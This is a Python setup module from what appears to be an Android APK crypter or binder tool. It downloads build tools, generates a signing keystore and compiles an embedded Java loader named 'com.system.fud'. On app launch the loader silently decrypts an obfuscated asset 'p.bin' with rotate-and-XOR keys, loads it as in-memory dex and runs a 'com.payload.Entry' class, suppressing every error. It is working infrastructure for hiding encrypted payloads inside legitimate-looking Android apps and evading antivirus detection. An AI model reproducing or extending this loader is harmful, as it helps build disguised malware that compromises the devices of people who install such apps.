"""Auto-download: JRE, ecj, apktool, build-tools, android.jar, keystore, loader.dex."""
import os
import shutil
import stat
import tarfile
import threading
import urllib.request
import zipfile
from config import (
    TOOLS_DIR, KEYSTORE_PATH, KEYSTORE_PASS, KEY_ALIAS,
    JAVA_BIN, ECJ_JAR, APKTOOL_JAR, BT_DIR,
    APKSIGNER_BIN, ZIPALIGN_BIN, D8_BIN, ANDROID_JAR,
    LOADER_SRC_DIR, LOADER_DEX,
    URL_JRE, URL_ECJ, URL_APKTOOL, URL_BUILDTOOLS,
    PAYLOAD_KEY1, PAYLOAD_KEY2, PAYLOAD_ROT,
)
from _proc import run_stream

PLATFORM_ZIP_URLS = [
    "https://dl.google.com/android/repository/platform-34_r02.zip",
    "https://dl.google.com/android/repository/platform-34-ext7_r02.zip",
    "https://dl.google.com/android/repository/platform-34-ext7_r01.zip",
    "https://dl.google.com/android/repository/platform-33_r03.zip",
    "https://dl.google.com/android/repository/platform-33_r02.zip",
    "https://dl.google.com/android/repository/platform-32_r01.zip",
]

PLATFORM_JAR_URLS = [
    "https://raw.githubusercontent.com/Sable/android-platforms/master/android-30/android.jar",
    "https://github.com/Sable/android-platforms/raw/master/android-30/android.jar",
    "https://raw.githubusercontent.com/Sable/android-platforms/master/android-28/android.jar",
]

_READY_FLAG = os.path.join(TOOLS_DIR, ".ready")
_setup_lock = threading.Lock()
_setup_done = threading.Event()
_setup_error = {"exc": None}


def _download(url, dest):
    if os.path.exists(dest) and os.path.getsize(dest) > 0:
        print(f"[i] {os.path.basename(dest)} already present", flush=True)
        return
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    print(f"[*] downloading {os.path.basename(dest)} <- {url}", flush=True)
    tmp = dest + ".part"
    urllib.request.urlretrieve(url, tmp)
    os.replace(tmp, dest)
    print(f"[✓] {os.path.basename(dest)} {os.path.getsize(dest)} bytes", flush=True)


def _extract_jre():
    if os.path.exists(JAVA_BIN):
        print("[i] jre already present", flush=True)
        return
    tgz = os.path.join(TOOLS_DIR, "jre.tgz")
    _download(URL_JRE, tgz)
    print("[*] extracting jre ...", flush=True)
    with tarfile.open(tgz) as t:
        try:
            t.extractall(TOOLS_DIR, filter="fully_trusted")
        except TypeError:
            t.extractall(TOOLS_DIR)
    # locate extracted jdk dir
    picked = None
    for d in sorted(os.listdir(TOOLS_DIR)):
        full = os.path.join(TOOLS_DIR, d)
        if not os.path.isdir(full):
            continue
        if d == "jre":
            continue
        if ("jdk-" in d) or (d.lower().startswith("jre")):
            if os.path.exists(os.path.join(full, "bin", "java")):
                picked = full
                break
    if not picked:
        raise RuntimeError("jre extracted but no bin/java found")
    target = os.path.join(TOOLS_DIR, "jre")
    if os.path.exists(target):
        shutil.rmtree(target)
    os.rename(picked, target)
    if os.path.exists(tgz):
        os.remove(tgz)
    print(f"[✓] jre ready → {JAVA_BIN}", flush=True)


def _extract_build_tools():
    if os.path.exists(APKSIGNER_BIN):
        print("[i] build-tools already present", flush=True)
        return
    zpath = os.path.join(TOOLS_DIR, "bt.zip")
    _download(URL_BUILDTOOLS, zpath)
    print("[*] extracting build-tools ...", flush=True)
    with zipfile.ZipFile(zpath) as z:
        z.extractall(TOOLS_DIR)
    picked = None
    for d in sorted(os.listdir(TOOLS_DIR)):
        full = os.path.join(TOOLS_DIR, d)
        if os.path.isdir(full) and d.startswith("android-"):
            if os.path.exists(os.path.join(full, "apksigner")):
                picked = full
                break
    if not picked:
        raise RuntimeError("build-tools extracted but apksigner not found")
    if os.path.exists(BT_DIR):
        shutil.rmtree(BT_DIR)
    os.rename(picked, BT_DIR)
    if os.path.exists(zpath):
        os.remove(zpath)
    for b in (APKSIGNER_BIN, ZIPALIGN_BIN, D8_BIN):
        if os.path.exists(b):
            os.chmod(b, os.stat(b).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
    print(f"[✓] build-tools ready → {BT_DIR}", flush=True)


def _extract_platform():
    if os.path.exists(ANDROID_JAR) and os.path.getsize(ANDROID_JAR) > 0:
        print("[i] android.jar already present", flush=True)
        return
    os.makedirs(os.path.dirname(ANDROID_JAR), exist_ok=True)

    for jar_url in PLATFORM_JAR_URLS:
        try:
            print(f"[*] trying direct jar: {jar_url}", flush=True)
            tmp = ANDROID_JAR + ".part"
            urllib.request.urlretrieve(jar_url, tmp)
            if os.path.getsize(tmp) > 1024 * 100:
                os.replace(tmp, ANDROID_JAR)
                print(f"[✓] android.jar {os.path.getsize(ANDROID_JAR)} bytes", flush=True)
                return
            os.remove(tmp)
        except Exception as e:
            print(f"[!] jar mirror failed: {e}", flush=True)

    zpath = os.path.join(TOOLS_DIR, "plat.zip")
    for zip_url in PLATFORM_ZIP_URLS:
        try:
            print(f"[*] trying zip: {zip_url}", flush=True)
            if os.path.exists(zpath):
                os.remove(zpath)
            urllib.request.urlretrieve(zip_url, zpath)
            tmp_ex = os.path.join(TOOLS_DIR, "_platform_tmp")
            if os.path.exists(tmp_ex):
                shutil.rmtree(tmp_ex)
            with zipfile.ZipFile(zpath) as z:
                z.extractall(tmp_ex)
            jar_path = None
            for root, _, files in os.walk(tmp_ex):
                if "android.jar" in files:
                    jar_path = os.path.join(root, "android.jar")
                    break
            if jar_path and os.path.getsize(jar_path) > 1024 * 100:
                shutil.copy2(jar_path, ANDROID_JAR)
                shutil.rmtree(tmp_ex, ignore_errors=True)
                os.remove(zpath)
                print(f"[✓] android.jar {os.path.getsize(ANDROID_JAR)} bytes", flush=True)
                return
            shutil.rmtree(tmp_ex, ignore_errors=True)
            os.remove(zpath)
        except Exception as e:
            print(f"[!] zip failed: {e}", flush=True)
            if os.path.exists(zpath):
                os.remove(zpath)

    raise RuntimeError("android.jar unavailable from all mirrors")


def _ensure_keystore():
    if os.path.exists(KEYSTORE_PATH):
        print("[i] keystore already present", flush=True)
        return
    os.makedirs(TOOLS_DIR, exist_ok=True)
    print("[*] generating keystore ...", flush=True)
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12
    import datetime

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME,       "System"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "System"),
        x509.NameAttribute(NameOID.COUNTRY_NAME,      "US"),
    ])
    now = datetime.datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject).issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + datetime.timedelta(days=9125))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )
    p12 = pkcs12.serialize_key_and_certificates(
        name=KEY_ALIAS.encode(), key=key, cert=cert, cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(KEYSTORE_PASS.encode()),
    )
    with open(KEYSTORE_PATH, "wb") as f:
        f.write(p12)
    print("[✓] keystore ready", flush=True)


_LOADER_JAVA = r"""
package com.system.fud;

import android.content.Context;
import android.os.Build;
import dalvik.system.DexClassLoader;
import dalvik.system.InMemoryDexClassLoader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;

public final class Loader {
    private static final byte[] K1 = {__K1__};
    private static final byte[] K2 = {__K2__};
    private static final int ROT = __ROT__;

    public static void init(Context ctx) {
        try {
            InputStream is = ctx.getAssets().open("p.bin");
            byte[] enc = readAll(is);
            byte[] dex = decrypt(enc);
            if (dex == null || dex.length < 2) return;
            ClassLoader cl = makeLoader(ctx, dex);
            Class<?> entry = cl.loadClass("com.payload.Entry");
            Method m = entry.getMethod("start", Context.class);
            m.invoke(null, ctx);
        } catch (Throwable t) {
        }
    }

    private static byte[] decrypt(byte[] in) {
        byte[] out = new byte[in.length];
        for (int i = 0; i < in.length; i++) {
            int b = in[i] & 0xFF;
            b = ((b << ROT) | (b >>> (8 - ROT))) & 0xFF;
            b ^= (K1[i % K1.length] & 0xFF);
            b ^= (K2[(i * 3) % K2.length] & 0xFF);
            out[i] = (byte) b;
        }
        if (out.length == 0) return out;
        int pad = out[out.length - 1] & 0xFF;
        if (pad > 0 && pad <= 16 && pad <= out.length) {
            boolean ok = true;
            for (int i = out.length - pad; i < out.length; i++) {
                if ((out[i] & 0xFF) != pad) { ok = false; break; }
            }
            if (ok) {
                byte[] t = new byte[out.length - pad];
                System.arraycopy(out, 0, t, 0, t.length);
                return t;
            }
        }
        return out;
    }

    private static ClassLoader makeLoader(Context ctx, byte[] dex) throws Exception {
        if (Build.VERSION.SDK_INT >= 26) {
            return new InMemoryDexClassLoader(ByteBuffer.wrap(dex), ctx.getClassLoader());
        }
        File tmp = new File(ctx.getCacheDir(), "d" + System.nanoTime() + ".dex");
        FileOutputStream fos = new FileOutputStream(tmp);
        fos.write(dex);
        fos.close();
        DexClassLoader cl = new DexClassLoader(
            tmp.getAbsolutePath(), ctx.getCacheDir().getAbsolutePath(),
            null, ctx.getClassLoader());
        tmp.delete();
        return cl;
    }

    private static byte[] readAll(InputStream is) throws Exception {
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = is.read(buf)) > 0) bo.write(buf, 0, n);
        is.close();
        return bo.toByteArray();
    }
}
"""

_FUD_APP_TEMPLATE = r"""
package com.system.fud;

import android.content.Context;

public class FudApp extends {SUPER} {
    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        Loader.init(base);
    }
}
"""


def _java_bytes(b: bytes) -> str:
    return ",".join(f"(byte)0x{x:02X}" for x in b)


def _ensure_loader_dex():
    if os.path.exists(LOADER_DEX):
        print("[i] loader.dex already present", flush=True)
        return
    print("[*] building loader.dex ...", flush=True)
    os.makedirs(LOADER_SRC_DIR, exist_ok=True)

    loader_src = (_LOADER_JAVA
                  .replace("__K1__", _java_bytes(PAYLOAD_KEY1))
                  .replace("__K2__", _java_bytes(PAYLOAD_KEY2))
                  .replace("__ROT__", str(PAYLOAD_ROT)))

    with open(os.path.join(LOADER_SRC_DIR, "Loader.java"), "w") as f:
        f.write(loader_src)

    with open(os.path.join(LOADER_SRC_DIR, "FudApp.java"), "w") as f:
        f.write(_FUD_APP_TEMPLATE.replace("{SUPER}", "android.app.Application"))

    _compile_dex(LOADER_SRC_DIR, LOADER_DEX)


def _compile_dex(src_dir: str, out_dex: str):
    print(f"[*] _compile_dex: src={src_dir} out={out_dex}", flush=True)
    classes_dir = src_dir + "_classes"
    if os.path.exists(classes_dir):
        shutil.rmtree(classes_dir)
    os.makedirs(classes_dir, exist_ok=True)

    java_files = [os.path.join(src_dir, f) for f in os.listdir(src_dir) if f.endswith(".java")]
    if not java_files:
        raise RuntimeError(f"no .java in {src_dir}")

    # 1) ecj compile
    run_stream(
        [JAVA_BIN, "-jar", ECJ_JAR,
         "-source", "1.8", "-target", "1.8",
         "-cp", ANDROID_JAR,
         "-d", classes_dir] + java_files,
        timeout=300, label="ecj",
    )

    class_files = []
    for root, _, files in os.walk(classes_dir):
        for f in files:
            if f.endswith(".class"):
                class_files.append(os.path.join(root, f))
    if not class_files:
        raise RuntimeError("no .class produced")

    d8_out = src_dir + "_d8out"
    if os.path.exists(d8_out):
        shutil.rmtree(d8_out)
    os.makedirs(d8_out, exist_ok=True)

    # 2) d8 → dex
    run_stream(
        [D8_BIN, "--min-api", "24", "--release",
         "--lib", ANDROID_JAR,
         "--output", d8_out] + class_files,
        timeout=300, label="d8",
    )

    produced = os.path.join(d8_out, "classes.dex")
    if not os.path.exists(produced):
        raise RuntimeError("d8 did not produce classes.dex")
    shutil.copy2(produced, out_dex)
    shutil.rmtree(d8_out, ignore_errors=True)
    shutil.rmtree(classes_dir, ignore_errors=True)
    print(f"[✓] dex written → {out_dex}", flush=True)


def _do_setup():
    _extract_jre()
    _download(URL_ECJ, ECJ_JAR)
    _download(URL_APKTOOL, APKTOOL_JAR)
    _extract_build_tools()
    _extract_platform()
    _ensure_keystore()
    _ensure_loader_dex()
    with open(_READY_FLAG, "w") as f:
        f.write("ok")
    print("[✓] ALL TOOLS READY", flush=True)


def ensure_tools():
    if os.path.exists(_READY_FLAG):
        _setup_done.set()
        return
    with _setup_lock:
        if os.path.exists(_READY_FLAG):
            _setup_done.set()
            return
        try:
            _do_setup()
            _setup_error["exc"] = None
        except Exception as e:
            _setup_error["exc"] = e
            print(f"[!] setup failed: {e}", flush=True)
            raise
        finally:
            _setup_done.set()


def wait_ready(timeout: float = 900.0) -> bool:
    if os.path.exists(_READY_FLAG):
        return True
    ok = _setup_done.wait(timeout)
    if _setup_error["exc"]:
        raise _setup_error["exc"]
    return ok and os.path.exists(_READY_FLAG)
